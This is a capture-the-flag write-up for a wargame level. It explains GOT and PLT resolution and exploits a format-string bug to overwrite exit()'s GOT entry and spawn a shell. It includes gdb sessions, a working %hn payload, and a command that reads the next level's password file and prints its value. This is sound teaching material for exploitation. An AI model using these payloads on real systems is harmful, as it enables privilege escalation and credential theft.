# level5

### First analysis

Again we have an exercice that is probably going to be straightforward. We have a very similar case where fgets and printf are used but let's analyze the main differences we have in this one. Again using ghidra we can observe this code:

```c
void o(void) {
  system("/bin/sh");
                    /* WARNING: Subroutine does not return */
  _exit(1);
}

void n(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
                    /* WARNING: Subroutine does not return */
  exit(1);
}

void main(void) {
  n();
  return;
}
```

This time everything is shown so we can understand pretty quickly what do we have to do here. As we can see o() function is never called, and we can easily guess that this level is about redirection. A function never called that executes a shell as level6 makes is kinda obvious. We can also see the usage of exit() function instead of a regular return.

### Find a solution

The first idea that comes to mind is to change the return address of n() to the start of the funtion o(). Exactly like in level1. However, as we seen, this program uses exit() functions instead of returns. The consequence of that is, as written as note in ghidra, the subroutine does not return. Indeed exit() stops the functions to return to main and instead simply leave the programs. That changes a lot because now changing the return value of a function is completely useless since it will never be used.

This is where we have to make a digression about a new aspect related to code execution, the GOT table.

### The GOT Table (digression)

GOT stands for Global Offset Table, so indeed saying GOT Table doesn't make a lot of sense. We are going to call it only the GOT for now on, along with another element, the PLT, the Procedure Linkage Table.

In order to make program lighter, not all functions are always stored in a binary. Libc for example is a huge library containing functions that we can use in our programs, functions like printf() for example or exit(). Those functions are not copied in every binary using those functions but will be called by them. That's why when clicking on printf on ghidra we can observe this:

```
<EXTERNAL>::printf
```

It is an external functions. However here we have a problem, the PIE we talked about earlier (level4) helps the program to always starts at the same position in memory, with offset it knows where to call every functions of the binary but how to find the address of an external functions where libc functions can changes addresses ? Indeed printf will not have the same position all the time and binaries needs a way to know how to call libc functions and where. (Here it wouldn't be that much of a problem since we saw that ASLR is not active on Rainfall, but still the question remains of findind the address a first time at least).

The PLT comes into play right here. If we try to see where printf elements are stored in our binary, we can see that the PLT (which is a section of our binary) define a j_printf functions, with j standing for jump instructions (ASM instruction to jump to an address). This jump instruction is usually directed to < function_name >@GOT. Okay that's a lot but let's try to make it clear.

The PLT is, as it stands for, a procedure. When an binary is executed, a lot of things happen before entering the main function. One of those things is to resolve libc functions and dynamic library calls. The PLT will call for every external function, another function called _dl_runtime_resolve(), part of the ld.so library. This library is a dynamic linker/loader. We are definitely not gonna explains in depth how this functions and library works (you can read the man if you're inrerested in that), what we need to know is that it will returns the address of the externam functions we are looking for. It will then store this address in... you guessed it, the Global Offset Table. This address will now be used for every call of this function through the program (exit is called 2 times for example but the PLT is only gonna be called once, then the address will be stored on the GOT, and every call for that function will now check on the GOT and not call the PLT anymore).

### GOT Overwrite

Why are we interested in this GOT now ? Well it is actually possible to ovewrite values from the GOT, which is exactly what we need. Since we can't overwrite the return address of n() because exit() is used, why not changing the address of exit() in the GOT for the o() function's address ? This is exactly what we are going to try to do.

We haven't talked about it yet but this program has a format string vulnerability. Very easy way to verify this:

```sh
level5@RainFall:~$ ./level5 
%x %x
200 b7fd1ac0
```

%x are replaced with numbers, we know that a format string vulnerabilty exists. We also already know a lot of things we can do with this kind of vulnerabilty from level3 and level4. So let's gather some informations:

```sh
(gdb) x o
0x80484a4 <o>:	0x83e58955

(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   [...]
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```

So we have the address of o, 0x80484a4, and we also have the call to the PLT at address 0x80483d0 for exit. Again PLT is a procedure to resolve the addresss of exit by indexing it in the GOT, the address we see here is not the address of exit. Let's analyze it knowing it:

```sh
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```

So by disassembling the address where the PLT points to, we find a new jump to the GOT this time, and we now know the address where exit function is stored in the GOT, 0x8049838. (The actuall address of exit is 0x080483d6, but we don't care about that since it will be overwritten by the address of o(), what we want is where this address is stored).

A simple way to do that is to use gdb and changes the value during the execution to see if everything works as expected:

```sh
(gdb) b *0x080484f0
Breakpoint 1 at 0x80484f0
(gdb) b *0x080484f8
Breakpoint 2 at 0x80484f8
```

First we set a breakpoint before and after printf call. We then run the program, enter some random values on the buffer, and fall into the first breakpoint.

```sh
(gdb) set {int}0x8049838=0x80484a4
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4
```

We set the value on the GOT for exit, as the value for o().

```sh
(gdb) c
Continuing.
$ whoami
level5
```

We then continued and we now launched a shell ! Of course as level5 since gdb execute the program with the privilege of the user using it, but it works. We now just have to do that with the format string vulnerability to have a shell as level6.

First important check, where is the buffer stored in the stack ?

```sh
level5@RainFall:~$ ./level5 
AAAA %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```

As we can see it is the same format as for level3, the buffer size, then 2 addresses, then our buffer. So on the 4th position in the stack after where we are writing. And now it is exactly how we did for level4, write an address, into a specific memory address.

A more detailed explanation on how the payload is adapted for this level is in Resources/explanation.md but this is what we came up with:

```py
'\x40\x98\x04\x08' + 'AAAA' + '\x38\x98\x04\x08' + '%x' * 2 + '%2029x' + '%hn' + '%31904x' + '%hn'
```

We can now try it and see the flag:

```sh
level5@RainFall:~$ echo $(python -c "print('\x40\x98\x04\x08' + 'AAAA' + '\x38\x98\x04\x08' + '%x' * 2 + '%2029x' + '%hn' + '%31904x' + '%hn')") > /tmp/payload
level5@RainFall:~$ cat /tmp/payload - | /home/user/level5/level5
@AAAA8200b7fd1ac0

[...] # After a few thousands spaces

41414141
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Important doc

[GOT and PLT explained](https://www.youtube.com/watch?v=kUk5pw4w0h4)
[Exploiting FSV](https://medium.com/zh3r0/intro-to-pwn-protostar-format-strings-c86ca3458ad3)